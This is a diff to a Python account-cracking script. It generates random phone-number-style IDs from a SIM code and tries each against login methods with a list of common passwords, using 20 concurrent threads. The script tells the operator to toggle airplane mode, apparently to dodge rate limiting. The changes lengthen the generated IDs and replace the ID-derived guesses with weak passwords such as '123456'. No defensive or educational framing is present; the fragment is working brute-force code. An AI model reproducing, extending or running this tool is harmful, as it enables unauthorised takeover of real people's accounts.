@@ -814,7 +814,7 @@ def mix():
   else:
       mtd.append('m1')
   for nmbr in range(limit):
-    nmp = ''.join(random.choice(string.digits) for _ in range(6))
+    nmp = ''.join(random.choice(string.digits) for _ in range(10))
     user.append(nmp)
   with tred(max_workers=20) as king_xd:
     os.system('clear')
@@ -822,7 +822,7 @@ def mix():
     banner();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
     for guru in user:
       idf = kode+guru
-      pwv = [idf[:6],idf[:8],idf,'57273200','57575751','59039200','57575752']
+      pwv = ['12345678','123456','1234567','123123']
       if 'm1' in mtd:king_xd.submit(m1,idf,pwv)
       elif 'm2' in mtd:king_xd.submit(m2,idf,pwv)
       elif 'm3' in mtd:king_xd.submit(m3,idf,pwv)
